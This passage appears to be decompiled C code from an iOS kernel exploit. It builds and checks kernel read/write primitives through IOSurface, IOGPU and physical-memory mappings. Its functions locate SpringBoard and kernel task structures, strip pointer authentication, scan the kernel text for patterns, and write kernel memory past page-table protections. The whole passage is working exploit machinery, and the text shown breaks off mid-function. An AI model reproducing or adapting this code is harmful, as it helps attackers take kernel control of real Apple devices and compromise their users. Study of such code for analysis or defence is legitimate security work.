  *((uint32_t *)v41 + 34) = semaphore;
  v45 = pthread_mutex_init((pthread_mutex_t *)(v41 + 32), 0);
  if ( v45 )
  {
    v43 = 0;
    LODWORD(v44) = 0;
    if ( v45 >= 0 )
      v46 = v45;
    else
      v46 = -v45;
    v6 = v46 | 0x40000000u;
    goto LABEL_130;
  }
  v47 = 2 * number_of_cpus();
  if ( v47 <= 8 )
    v44 = 8;
  else
    v44 = v47;
  *((uint32_t *)v41 + 31) = v44;
  v48 = calloc(v44, 8u);
  *((uint64_t *)v41 + 16) = v48;
  if ( !v48 )
  {
LABEL_129:
    v43 = 1;
    goto LABEL_130;
  }
  v49 = mach_absolute_time();
  v50 = (_opaque_pthread_t *)*((uint64_t *)v41 + 13);
  v81 = v44;
  if ( v50 )
    goto LABEL_89;
  v80 = v49;
  v6 = 0;
  v54 = 2;
  do
  {
    *((uint64_t *)v41 + 3) = 0;
    if ( v54 >= (unsigned int)v44 )
      v55 = (unsigned int)v44;
    else
      v55 = v54;
    *((uint32_t *)v41 + 30) = 0;
    *((uint32_t *)v41 + 31) = v55;
    bzero(*((void **)v41 + 16), 8 * v55);
    if ( (mach_absolute_time() - v80) * krwCtx->timebase.numer / krwCtx->timebase.denom > 0x12A15343FLL )
    {
      v6 = ERR_TIMEOUT;
      goto LABEL_129;
    }
    LODWORD(v56) = *((uint32_t *)v41 + 31);
    if ( (uint32_t)v56 )
    {
      v79 = v54;
      v57 = 0;
      v58 = 0;
      do
      {
        v59 = (pthread_t *)(*((uint64_t *)v41 + 16) + v57);
        v60 = (void *(__cdecl *)(void *))nullsub_1(semaphore_mem_acquire_thread);
        v61 = pthread_create(v59, 0, v60, v41);
        if ( v61 )
        {
          if ( v61 >= 0 )
            v69 = v61;
          else
            v69 = -v61;
          v6 = v69 | 0x40000000u;
          goto LABEL_123;
        }
        ++v58;
        v56 = *((unsigned int *)v41 + 31);
        v57 += 8;
      }
      while ( v58 < v56 );
      LODWORD(v44) = v81;
      v54 = v79;
    }
    if ( (uint32_t)v6 )
      goto LABEL_129;
    if ( *((uint32_t *)v41 + 30) < (unsigned int)v56 )
    {
      do
        thread_switch(0, 2, 1u);
      while ( *((uint32_t *)v41 + 30) < *((uint32_t *)v41 + 31) );
    }
    v62 = pthread_mutex_lock((pthread_mutex_t *)(v41 + 32));
    if ( v62 )
      goto LABEL_124;
    v63 = *((uint32_t *)v41 + 31);
    if ( !v63 )
    {
LABEL_110:
      v6 = 0;
      goto LABEL_115;
    }
    v64 = 0;
    while ( 1 )
    {
      v65 = *((uint64_t *)v41 + 16);
      v66 = *(_opaque_pthread_t **)(v65 + 8 * v64);
      if ( v66 != *((_opaque_pthread_t **)v41 + 13) )
        break;
LABEL_109:
      *(uint64_t *)(v65 + 8 * v64++) = 0;
      if ( v64 >= v63 )
        goto LABEL_110;
    }
    v67 = pthread_join(v66, 0);
    if ( !v67 )
    {
      v65 = *((uint64_t *)v41 + 16);
      v63 = *((uint32_t *)v41 + 31);
      goto LABEL_109;
    }
    if ( v67 >= 0 )
      v68 = v67;
    else
      v68 = -v67;
    v6 = v68 | 0x40000000u;
LABEL_115:
    v62 = pthread_mutex_unlock((pthread_mutex_t *)(v41 + 32));
    if ( v62 )
    {
LABEL_124:
      if ( v62 >= 0 )
        v70 = v62;
      else
        v70 = -v62;
      v6 = v70 | 0x40000000u;
      goto LABEL_129;
    }
    v54 <<= v54 < (unsigned int)v44;
    v50 = (_opaque_pthread_t *)*((uint64_t *)v41 + 13);
  }
  while ( !v50 );
  if ( !(uint32_t)v6 )
  {
LABEL_89:
    v51 = pthread_mach_thread_np(v50);
    v6 = 0;
    v52 = semaphore;
    v53 = *((uint64_t *)v41 + 14);
    goto LABEL_134;
  }
LABEL_123:
  v43 = 1;
  LODWORD(v44) = v81;
LABEL_130:
  if ( semaphore + 1 >= 2 )
  {
    v71 = v43;
    semaphore_signal(semaphore);
    semaphore_destroy(mach_task_self_, semaphore);
    v43 = v71;
  }
  if ( !v41 )
    goto LABEL_142;
  v81 = v44;
  v52 = 0;
  v51 = 0;
  v53 = 0;
  v27 = 0;
  v23 = 0;
  v26 = 0;
  if ( v43 )
  {
LABEL_134:
    v23 = v51;
    v27 = v52;
    pthread_mutex_destroy((pthread_mutex_t *)(v41 + 32));
    v26 = v53;
  }
  v72 = (pthread_t *)*((uint64_t *)v41 + 16);
  if ( v72 )
  {
    v73 = *((uint32_t *)v41 + 31);
    if ( v73 )
    {
      v74 = 0;
      while ( 1 )
      {
        if ( v72[v74] )
        {
          pthread_join(v72[v74], 0);
          v72 = (pthread_t *)*((uint64_t *)v41 + 16);
          v73 = *((uint32_t *)v41 + 31);
        }
        v72[v74++] = 0;
        if ( v74 >= v73 )
          break;
        v72 = (pthread_t *)*((uint64_t *)v41 + 16);
      }
      v72 = (pthread_t *)*((uint64_t *)v41 + 16);
    }
    bzero(v72, 8LL * v81);
    free(*((void **)v41 + 16));
  }
  free(v41);
LABEL_146:
  v75 = krwCtx->gap_0x90;
  if ( v75 )
  {
    v76 = krwCtx->gap_0x98;
    if ( v76 )
    {
      vm_deallocate(mach_task_self_, v75, v76);
      krwCtx->gap_0x90 = 0;
      krwCtx->gap_0x98 = 0;
    }
  }
  if ( v34 )
    free(v34);
  if ( v83 && (uint32_t)v32 )
    vm_deallocate(mach_task_self_, (vm_address_t)v83, v32);
  if ( (uint32_t)v6 )
    goto LABEL_158;
LABEL_155:
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & 0x20) != 0 )
  {
    v78 = 0;
  }
  else
  {
    v6 = map_physpage_with_mem_entry(krwCtx, &address, v4, v26);
    if ( (uint32_t)v6 )
      goto LABEL_158;
    v78 = (__int64 *)((krwCtx->pageMask & v26) + address);
    v6 = ERR_INVALID_KADDR;
    if ( !validate_kaddr_range(krwCtx, *v78) )
      goto LABEL_158;
  }
  v6 = 0;
  krwCtx->threadForKernelRead = v23;
  krwCtx->threadStateMapAddr = address;
  krwCtx->threadStateMapSize = v4;
  krwCtx->threadStatePageOffset = krwCtx->pageMask & v26;
  krwCtx->threadStateMappedPtr = (uint64_t)v78;
  krwCtx->threadStateScratchKaddr = v27;
  krwCtx->threadStateKrwPhysAddr = v26;
  return v6;
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (00000000000280A0) ----------------------------------------------------
__int64 __fastcall map_physpage_with_mem_entry(struct_krwCtx *krwCtx, vm_address_t *a2, vm_size_t a3, __int64 a4)
{
  mem_entry_name_port_t v4; // w5
  kern_return_t v6; // w0

  v4 = krwCtx->ioSurfaceMemEntryMaybe;
  if ( v4 + 1 < 2 )
    return 708609;
  v6 = vm_map(mach_task_self_, a2, a3, 0, 1, v4, a4 & ~krwCtx->pageMask, 0, 3, 3, 2u);
  if ( v6 )
    return v6 | 0x80000000;
  else
    return 0;
}

//----- (000000000002811C) ----------------------------------------------------
__int64 __fastcall join_destroy_krw_thread(__int64 a1)
{
  mach_port_t v2; // w0
  _opaque_pthread_t *v3; // x20
  semaphore_t v4; // w0
  vm_address_t v5; // x1
  vm_size_t v6; // x2
  mach_port_name_t v7; // w1

  v2 = *(uint32_t *)(a1 + 172);
  if ( v2 + 1 >= 2 )
  {
    v3 = pthread_from_mach_thread_np(v2);
    v4 = *(uint32_t *)(a1 + 208);
    if ( v4 + 1 >= 2 )
    {
      semaphore_signal(v4);
      semaphore_destroy(mach_task_self_, *(uint32_t *)(a1 + 208));
      *(uint32_t *)(a1 + 208) = 0;
      if ( !v3 )
        goto LABEL_5;
    }
    else if ( !v3 )
    {
LABEL_5:
      *(uint32_t *)(a1 + 172) = 0;
      goto LABEL_6;
    }
    pthread_join(v3, 0);
    goto LABEL_5;
  }
LABEL_6:
  v5 = *(uint64_t *)(a1 + 176);
  if ( v5 )
  {
    v6 = *(uint64_t *)(a1 + 184);
    if ( v6 )
    {
      vm_deallocate(mach_task_self_, v5, v6);
      *(uint64_t *)(a1 + 176) = 0;
      *(uint64_t *)(a1 + 184) = 0;
    }
  }
  *(uint64_t *)(a1 + 200) = 0;
  v7 = *(uint32_t *)(a1 + 88);
  if ( v7 + 1 >= 2 )
  {
    mach_port_deallocate(mach_task_self_, v7);
    *(uint32_t *)(a1 + 88) = 0;
  }
  return 0;
}

//----- (00000000000281F0) ----------------------------------------------------
__int64 __fastcall iosurface_check_and_alloc_port(struct_krwCtx *krwCtx)
{
  uint64_t IOKitConnInfo; // x20
  kern_return_t v4; // w0
  mach_port_name_t name; // [xsp+Ch] [xbp-14h] BYREF

  IOKitConnInfo = krwCtx->IOKitConnInfo;
  if ( !IOKitConnInfo )
    return 708609;
  if ( (unsigned int)(*(uint32_t *)(IOKitConnInfo + 112) + 1) < 2 )
    return 0;
  name = 0;
  if ( (unsigned int)iosurface_call_struct_method_1(krwCtx, &name) )
    return alloc_iosurface_mach_port(krwCtx, 0x14u, *(uint32_t *)(IOKitConnInfo + 112));
  v4 = mach_port_deallocate(mach_task_self_, name);
  if ( v4 )
    return v4 | 0x80000000;
  else
    return 0;
}

//----- (0000000000028288) ----------------------------------------------------
__int64 __fastcall iosurface_call_struct_method_1(struct_krwCtx *krwCtx, mach_port_t *a2)
{
  __int64 v3; // x20
  kern_return_t v4; // w0
  size_t v6; // [xsp+0h] [xbp-70h] BYREF
  mach_port_t connection; // [xsp+Ch] [xbp-64h] BYREF
  __int128 outputStruct[4]; // [xsp+10h] [xbp-60h] BYREF

  connection = 0;
  v6 = 64;
  v3 = get_iosurface_mem_entry(krwCtx, 0x14u, &connection);
  if ( !(uint32_t)v3 )
  {
    memset(outputStruct, 0, sizeof(outputStruct));
    v4 = IOConnectCallStructMethod(connection, 1u, 0, 0, outputStruct, &v6);
    if ( v4 )
    {
      v3 = v4 | 0x80000000;
    }
    else
    {
      v3 = 0;
      *a2 = connection;
      connection = 0;
    }
  }
  if ( connection + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, connection);
  return v3;
}

//----- (0000000000028364) ----------------------------------------------------
__int64 __fastcall find_map_iosurface_memory(struct_krwCtx *krwCtx)
{
  uint64_t v1; // x24
  __int64 v3; // x20
  unsigned __int64 v4; // x0
  __int64 v5; // x0
  unsigned __int64 v6; // x0
  unsigned __int64 v7; // x0
  unsigned __int64 v8; // x21
  __int64 v9; // x25
  const CFDictionaryRef *v10; // x0
  io_service_t MatchingService; // w0
  io_object_t v12; // w22
  kern_return_t v13; // w0
  char v15; // w27
  unsigned __int64 v16; // x0
  unsigned __int64 v17; // x22
  __int64 v18; // x0
  __int64 v19; // x21
  unsigned __int64 v20; // x1
  __int64 v21; // x0
  __int64 v22; // x0
  __int64 v23; // x23
  int v24; // w8
  __int64 v25; // x8
  int v26; // w21
  __int64 v27; // x8
  __int64 v28; // x9
  __int64 v29; // x8
  __int64 v30; // [xsp+0h] [xbp-90h] BYREF
  io_connect_t connect; // [xsp+Ch] [xbp-84h] BYREF
  __int64 v32; // [xsp+10h] [xbp-80h] BYREF
  __int64 v33; // [xsp+18h] [xbp-78h] BYREF
  __int64 v34; // [xsp+20h] [xbp-70h] BYREF
  __int64 v35; // [xsp+28h] [xbp-68h] BYREF
  __int64 v36; // [xsp+30h] [xbp-60h] BYREF
  __int64 v37; // [xsp+38h] [xbp-58h] BYREF

  v34 = 0;
  v35 = 0;
  v32 = 0;
  v33 = 0;
  connect = 0;
  v1 = krwCtx->IOKitConnInfo;
  if ( !v1 )
  {
    v3 = 708642;
    goto LABEL_19;
  }
  if ( (unsigned int)iosurface_call_struct_method_1(krwCtx, &connect) )
  {
    v3 = 163878;
    v37 = 0;
    v4 = lookup_or_resolve_kaddr(krwCtx);
    if ( !v4 )
      goto LABEL_19;
    v5 = krw_task_for_name(krwCtx, v4, "SpringBoard");
    if ( !v5 )
      goto LABEL_19;
    v6 = walk_task_kaddr_chain(krwCtx, v5);
    if ( !v6 )
      goto LABEL_19;
    if ( !kread_physmap_decorated(krwCtx, v6, (unsigned __int64 *)&v36) )
      goto LABEL_47;
    if ( !validate_kaddr_range(krwCtx, v36) )
      goto LABEL_19;
    v7 = get_task_kobj_and_walk_chain(krwCtx, mach_task_self_);
    if ( !v7 )
      goto LABEL_19;
    v8 = v7;
    if ( !kread_physmap_decorated(krwCtx, v7, (unsigned __int64 *)&v37) )
    {
LABEL_47:
      v3 = 163855;
      goto LABEL_19;
    }
    if ( !validate_kaddr_range(krwCtx, v37) )
      goto LABEL_19;
    if ( (v37 ^ (unsigned __int64)v36) >> 32 )
    {
      v3 = 163857;
      goto LABEL_19;
    }
    v9 = 163856;
    if ( !(unsigned int)kwritebuf_universal(krwCtx, v8, &v36, 4) )
      goto LABEL_72;
    v10 = IOServiceMatching("IOGPU");
    MatchingService = IOServiceGetMatchingService(kIOMasterPortDefault, v10);
    if ( MatchingService + 1 < 2 )
    {
      if ( (unsigned int)kwritebuf_universal(krwCtx, v8, &v37, 4) )
        v3 = 708625;
      else
        v3 = 163856;
      goto LABEL_19;
    }
    v12 = MatchingService;
    v13 = IOServiceOpen(MatchingService, mach_task_self_, 1u, &connect);
    if ( v13 )
    {
      if ( v13 <= -536870213 )
        v3 = v13 | 0x80000000;
      else
        v3 = (v13 & 0xFFF) | 0x70000000u;
    }
    else
    {
      v3 = 0;
    }
    v26 = kwritebuf_universal(krwCtx, v8, &v37, 4);
    IOObjectRelease(v12);
    if ( !v26 )
      goto LABEL_72;
    if ( (uint32_t)v3 )
      goto LABEL_19;
    v15 = 0;
  }
  else
  {
    if ( *(uint64_t *)(v1 + 80) && *(uint64_t *)(v1 + 88) && *(uint64_t *)(v1 + 96) && *(uint64_t *)(v1 + 104) )
      goto LABEL_26;
    v15 = 1;
  }
  v16 = get_task_kobject_addr(krwCtx, connect);
  if ( !v16 )
  {
    v3 = 163877;
    goto LABEL_19;
  }
  v17 = v16;
  v9 = 163855;
  if ( !kread_physmap_decorated(krwCtx, v16 + 288, (unsigned __int64 *)&v35) )
    goto LABEL_72;
  if ( !validate_kaddr_range(krwCtx, v35) )
    goto LABEL_46;
  v18 = kaddr_to_phys_v1(krwCtx, v35 + 208);
  if ( !v18 )
    goto LABEL_46;
  v19 = v18;
  if ( !kread_physmap_decorated(krwCtx, v35 + 208, (unsigned __int64 *)&v34)
    || !kread_physmap_decorated(krwCtx, v35 + 16, (unsigned __int64 *)&v33) )
  {
    goto LABEL_72;
  }
  if ( !validate_kaddr_range(krwCtx, v33) )
    goto LABEL_46;
  if ( !kread_physmap_decorated(krwCtx, v33 + 16, (unsigned __int64 *)&v32) )
    goto LABEL_72;
  if ( !validate_kaddr_range(krwCtx, v32)
    || (v20 = krwCtx->gap_0x19D0) == 0
    || (v21 = maybe_ipc_port_get_kobject(krwCtx, v20)) == 0
    || (v22 = krw_task_for_pid_0(krwCtx, v21, 1)) == 0 )
  {
LABEL_46:
    v3 = 163878;
    goto LABEL_19;
  }
  v23 = v22;
  v24 = krwCtx->xnuMajorVersion;
  if ( v24 != 8792 && v24 != 10002 && v24 != 8796 )
    goto LABEL_65;
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A15_A16_A17_MASK) )
  {
    v25 = 984;
    goto LABEL_60;
  }
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_MASK) )
  {
    v25 = 960;
    goto LABEL_60;
  }
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A10_A11_A9_MASK) )
  {
LABEL_65:
    v3 = 163884;
    goto LABEL_19;
  }
  v25 = 936;
LABEL_60:
  if ( !kreadbuf_universal(krwCtx, v25 + v23, 8u, &v30, 1) )
    goto LABEL_72;
  v27 = v30;
  v3 = 163857;
  if ( v30 && (v30 & 7) == 0 )
  {
    if ( (v15 & 1) != 0 )
    {
LABEL_64:
      v28 = v34;
      *(uint64_t *)(v1 + 80) = v27;
      *(uint64_t *)(v1 + 88) = v28;
      v29 = v32;
      *(uint64_t *)(v1 + 96) = v19;
      *(uint64_t *)(v1 + 104) = v29;
LABEL_26:
      v3 = 0;
      *(uint32_t *)(v1 + 112) = connect;
      *(uint8_t *)(v1 + 74) = 1;
      return v3;
    }
    v3 = vm_attr_field_offset_add4_check(krwCtx, v23);
    if ( !(uint32_t)v3 )
    {
      v37 = v23;
      if ( !noppl_kwritebuf(krwCtx, v35 + 80, &v37, (unsigned int)krwCtx->stride_0x168, 1) )
      {
LABEL_73:
        v3 = 163856;
        goto LABEL_19;
      }
      if ( kread_physmap_decorated(krwCtx, v17 + 136, (unsigned __int64 *)&v36) )
      {
        v3 = 163878;
        if ( !validate_kaddr_range(krwCtx, v36) )
          goto LABEL_19;
        v37 = 0;
        if ( noppl_kwritebuf(krwCtx, v36 + 8, &v37, (unsigned int)krwCtx->stride_0x168, 1) )
        {
          v27 = v30;
          goto LABEL_64;
        }
        goto LABEL_73;
      }
LABEL_72:
      v3 = v9;
    }
  }
LABEL_19:
  if ( connect + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, connect);
  return v3;
}

//----- (0000000000028840) ----------------------------------------------------
bool __fastcall kread64(struct_krwCtx *krwCtx, unsigned __int64 vaddr, unsigned __int64 *out)
{
  uint64_t v5; // x20
  unsigned __int64 v6; // x1

  v5 = kread64_internal(krwCtx, vaddr, out);
  if ( v5 )
  {
    v6 = *out;
    if ( (krwCtx->flags & KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) != 0 )
      v6 = krw_xpac_vaddr(krwCtx, v6);
    *out = v6;
  }
  return v5;
}

//----- (00000000000288A4) ----------------------------------------------------
bool __fastcall kwrite_physmap_with_a3_ptr(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3)
{
  __int64 v4; // [xsp+8h] [xbp-8h] BYREF

  v4 = a3;
  return noppl_kwritebuf(krwCtx, a2, &v4, krwCtx->stride_0x168, 1);
}

//----- (00000000000288D4) ----------------------------------------------------
__int64 __fastcall krw_write_validation(struct_krwCtx *krwCtx)
{
  __int64 v2; // x28
  __int64 v3; // x21
  __int64 v4; // x27
  unsigned __int64 *v5; // x0
  unsigned __int64 *v6; // x20
  void *(__cdecl *v7)(void *); // x0
  int v8; // w0
  mach_port_t v9; // w0
  unsigned int v10; // w23
  int v11; // w22
  mach_timespec_t v12; // x1
  unsigned __int64 v13; // x0
  int v14; // w8
  unsigned __int64 v15; // x9
  pthread_t *v16; // x25
  uint64_t *v17; // x24
  __int64 v18; // x23
  unsigned __int64 v20; // x0
  unsigned __int64 v21; // x22
  vm_address_t v22; // x8
  __int64 v23; // x0
  __int64 v24; // x0
  int v25; // w8
  __int64 v26; // x0
  vm_size_t v27; // [xsp+0h] [xbp-180h]
  vm_address_t v28; // [xsp+8h] [xbp-178h] BYREF
  uint64_t workerPtrs[16]; // [xsp+10h] [xbp-170h] BYREF
  pthread_t workerThreads[16]; // [xsp+90h] [xbp-F0h] BYREF

  v2 = 0;
  v27 = vm_page_size;
  v28 = 0;
  v3 = 163878;
  memset(workerThreads, 0, sizeof(workerThreads));
  memset(workerPtrs, 0, sizeof(workerPtrs));
  v4 = 163848;
  while ( 1 )
  {
    v5 = (unsigned __int64 *)calloc(1u, 0x78u);
    workerPtrs[v2] = (uint64_t)v5;
    if ( !v5 )
    {
      v4 = 708617;
LABEL_20:
      v6 = 0;
      goto LABEL_22;
    }
    v6 = v5;
    v7 = (void *(__cdecl *)(void *))nullsub_1(ulock_wait_loop);
    v8 = pthread_create(&workerThreads[v2], 0, v7, v6);
    if ( v8 )
    {
      v6 = 0;
      if ( v8 >= 0 )
        v14 = v8;
      else
        v14 = -v8;
      v4 = v14 | 0x40000000u;
      goto LABEL_22;
    }
    v9 = pthread_mach_thread_np(workerThreads[v2]);
    if ( v9 + 1 < 2 )
      goto LABEL_20;
    v10 = v9;
    *((uint32_t *)v6 + 12) = v9;
    if ( !*((uint8_t *)v6 + 73) )
      break;
LABEL_9:
    v13 = get_task_kobject_addr(krwCtx, v10);
    if ( !v13 )
    {
      v4 = 163878;
      goto LABEL_20;
    }
    if ( (((v13 + 1520) ^ v13) & ~krwCtx->pageMask) == 0 )
    {
      v4 = 0;
      v15 = (uint64_t)workerThreads[v2];
      workerPtrs[v2] = 0;
      workerThreads[v2] = 0;
      LODWORD(v2) = v2 + 1;
      *v6 = v13;
      v6[5] = v15;
      goto LABEL_22;
    }
    if ( ++v2 == 16 )
    {
      v6 = 0;
      v4 = 708625;
      goto LABEL_23;
    }
  }
  v11 = 1002;
  while ( --v11 )
  {
    v12 = IDA_MACH_TIMESPEC(0xF424000000000ULL);
    semaphore_timedwait(krwCtx->semaphore, v12);
    if ( *((uint8_t *)v6 + 73) )
      goto LABEL_9;
  }
  v6 = 0;
  v4 = 4097;
LABEL_22:
  if ( (int)v2 <= 0 )
    goto LABEL_29;
LABEL_23:
  v16 = workerThreads;
  v17 = workerPtrs;
  v2 = (unsigned int)v2;
  do
  {
    v18 = *v17;
    if ( *v17 && (unsigned int)(*(uint32_t *)(v18 + 48) + 1) >= 2 && *v16 )
    {
      *(uint8_t *)(v18 + 72) = 1;
      __ulock_wake(0x201u, (void *)(v18 + 52), *(unsigned int *)(v18 + 48));
      pthread_join(*v16, 0);
      *v16 = 0;
      free((void *)v18);
      *v17 = 0;
    }
    ++v16;
    ++v17;
    --v2;
  }
  while ( v2 );
LABEL_29:
  if ( (uint32_t)v4 )
    return v4;
  krwCtx->IOKitConnInfo = (uint64_t)v6;
  if ( !v6 )
    return 708609;
  v20 = find_sptm_pgtable_state_block(krwCtx, *v6, 1);
  v6[1] = v20;
  if ( v20 )
  {
    v21 = *v6;
    v3 = physmap_maybe(krwCtx, &v28, v27, v20);
    if ( !(uint32_t)v3 )
    {
      v22 = v28;
      v6[2] = v28;
      v6[3] = v27;
      v6[4] = (krwCtx->pageMask & v21) + v22;
      v3 = init_pgtable_walk_ctx(krwCtx, 0);
      if ( !(uint32_t)v3 )
      {
        v23 = krwCtx->kernelMachoCtx;
        v3 = 708609;
        if ( v23 )
        {
          uint64_t text_range[3];
          uint64_t scan_range[3];

          macho_find_text_section(v23, text_range);
          scan_range[0] = text_range[0];
          scan_range[1] = text_range[1] + text_range[2] - 0x20000;
          scan_range[2] = 0x20000;
          v24 = kernel_pattern_scan((__int64)scan_range, "E8 0B 80 52", 0);
          if ( !v24 )
            return 708625;
          v25 = (unsigned __int16)((unsigned int)macho_read_u32((__int64 *)text_range[0], (__int64 *)(v24 - 8)) >> 5);
          if ( (unsigned int)(v25 - 1) >= 0xBFF )
            return 163857;
          *((uint32_t *)v6 + 14) = v25;
          if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(10002, 60, 75, 0, 3) || (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) == 0 )
          {
            if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11_TO_A17_OR_SELF_TASK_PORT_MASK) )
            {
              v26 = port_table_lookup_v1(krwCtx, v6[4], 1, 1, 96);
LABEL_47:
              v3 = v26;
              if ( (uint32_t)v26 )
                return v3;
            }
            return 0;
          }
          v26 = map_physpage_with_ports(krwCtx, v6[1], 1, 1, 96);
          goto LABEL_47;
        }
      }
    }
  }
  return v3;
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (0000000000028CE0) ----------------------------------------------------
unsigned __int64 __fastcall find_sptm_pgtable_state_block(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3)
{
  int v5; // w0
  struct
  {
    __int128 v7[2];
    __int64 v8;
  } out; // [xsp+0h] [xbp-50h] BYREF

  memset(&out, 0, sizeof(out));
  v5 = pgtable_walk_full(krwCtx, a2, (__int64)&out, a3).n128_u64[0];
  if ( v5 )
    return (krwCtx->pageMask & a2) | (out.v8 & 0xFFFFFFFFC000LL);
  else
    return 0;
}

//----- (0000000000028D44) ----------------------------------------------------
__int64 __fastcall teardown_sptm_pgtable_state(__int64 a1)
{
  __int64 v1; // x21
  uint64_t *v2; // x19
  vm_address_t v4; // x1
  vm_size_t v5; // x2

  v1 = 708609;
  v2 = *(uint64_t **)(a1 + 7496);
  if ( v2 )
  {
    v4 = v2[2];
    if ( !v4
      || (v5 = v2[3]) == 0
      || (vm_deallocate(mach_task_self_, v4, v5), v2[2] = 0, v2[3] = 0, (v2 = *(uint64_t **)(a1 + 7496)) != 0) )
    {
      *(uint64_t *)(a1 + 7496) = 0;
      *((uint8_t *)v2 + 72) = 1;
      __ulock_wake(0x201u, (void *)((char *)v2 + 52), *((unsigned int *)v2 + 12));
      pthread_join((pthread_t)v2[5], 0);
      *(__int128 *)v2 = 0u;
      *((__int128 *)v2 + 1) = 0u;
      *((__int128 *)v2 + 2) = 0u;
      *((__int128 *)v2 + 3) = 0u;
      *((__int128 *)v2 + 4) = 0u;
      *((__int128 *)v2 + 5) = 0u;
      *((__int128 *)v2 + 6) = 0u;
      v2[14] = 0;
      free(v2);
      return 0;
    }
  }
  return v1;
}

//----- (0000000000028DFC) ----------------------------------------------------
bool __fastcall noppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t address, int a3)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 (__fastcall *v5)(__int64, mach_vm_address_t, int *, __int64, __int64); // x8
  int v6; // w0
  kern_return_t v7; // w21
  vm_map_t v9; // w0
  int v10; // [xsp+8h] [xbp-28h] BYREF
  vm_machine_attribute_val_t value; // [xsp+Ch] [xbp-24h] BYREF

  v10 = a3;
  v5 = (__int64 (__fastcall *)(__int64, mach_vm_address_t, int *, __int64, __int64))krwCtx->iogpuKwriteFn;
  if ( v5 )
  {
    v6 = v5(krwCtx, address, &v10, 4, 1);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    v6 = iosurface_physmap_kwrite(krwCtx, address, (__int64)&v10, 4u, 1);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    v6 = ioconnect_callmethod_write(krwCtx, address, (__int64)&v10, 4u, 1);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd_size4 != -1 && krwCtx->gap_0x218 )
    {
      v6 = necp_ioconnect_krw(krwCtx, address, (__int64)&v10, 4u, 1);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v7 = mach_vm_write(krwCtx->targetVmPort, address, (vm_offset_t)&v10, 4u);
      v9 = krwCtx->targetVmPort;
      value = 7;
      mach_vm_machine_attribute(v9, address, 4u, 1u, &value);
      return v7 == 0;
    }
    v6 = pipe_pair_krw(krwCtx, address, &v10, 4u, 1);
  }
LABEL_3:
  if ( v6 )
    v7 = 5;
  else
    v7 = 0;
  return v7 == 0;
}

//----- (0000000000028F90) ----------------------------------------------------
__int64 __fastcall iosurface_physmap_kwrite(struct_krwCtx *krwCtx, unsigned __int64 a2, __int64 a3, unsigned int a4, int a5)
{
  __int64 v5; // x25
  uint64_t IOKitConnInfo; // x8
  unsigned int v8; // w26
  unsigned int v12; // w24
  __int64 v13; // x8
  __int64 v14; // x21
  unsigned __int64 v15; // x23
  __int64 v16; // x0
  size_t v17; // x2
  __int64 v18; // x25
  unsigned int v19; // w28
  unsigned __int64 v20; // x19
  unsigned __int64 v21; // x8
  __int64 v22; // x20
  unsigned int v23; // w21
  unsigned __int64 v24; // x24
  __int64 v25; // x0
  size_t v26; // x2
  int v27; // w19
  int v28; // w23
  vm_size_t v29; // x20
  __int64 v30; // x21
  uint64_t v31; // x26
  int v32; // w9
  __int64 v33; // x8
  __int64 v34; // x9
  __int64 v35; // x19
  __int64 *v36; // x27
  int v37; // w20
  unsigned __int64 v38; // x1
  __int64 v39; // x0
  __int64 paddr; // x0
  __int64 v41; // x19
  vm_address_t v42; // x8
  int v43; // w9
  bool v44; // zf
  __int64 v45; // x0
  __int64 v46; // x0
  int v47; // w8
  __int64 v48; // x19
  int v49; // w8
  unsigned int v50; // w8
  unsigned int v51; // w20
  __int64 v52; // x0
  __int64 v53; // x0
  int v54; // w0
  vm_size_t v56; // [xsp+8h] [xbp-B8h]
  unsigned __int64 v57; // [xsp+10h] [xbp-B0h]
  __int64 v58; // [xsp+18h] [xbp-A8h]
  unsigned int v59; // [xsp+24h] [xbp-9Ch]
  unsigned __int64 v60; // [xsp+28h] [xbp-98h]
  unsigned __int64 v61; // [xsp+30h] [xbp-90h]
  unsigned int v62; // [xsp+38h] [xbp-88h]
  int v63; // [xsp+40h] [xbp-80h] BYREF
  int v64; // [xsp+44h] [xbp-7Ch] BYREF
  int v65; // [xsp+48h] [xbp-78h] BYREF
  int v66; // [xsp+4Ch] [xbp-74h] BYREF
  unsigned __int64 v67; // [xsp+50h] [xbp-70h] BYREF
  __int64 v68; // [xsp+58h] [xbp-68h] BYREF
  vm_address_t address; // [xsp+60h] [xbp-60h] BYREF
  unsigned __int64 v70; // [xsp+68h] [xbp-58h] BYREF

  v5 = 708609;
  IOKitConnInfo = krwCtx->IOKitConnInfo;
  if ( !IOKitConnInfo )
  {
    TRACE_PORTS("iosurface_physmap_kwrite no state ctx=%llx addr=%llx size=%u\n",
                (unsigned long long)a1,
                (unsigned long long)a2,
                a4);
    return v5;
  }
  TRACE_PORTS("iosurface_physmap_kwrite enter ctx=%llx addr=%llx buf=%llx size=%u a5=%d state=%llx flags=%x byte4a=%u thread=%d ptr=%llx\n",
              (unsigned long long)krwCtx,
              (unsigned long long)a2,
              (unsigned long long)a3,
              a4,
              a5,
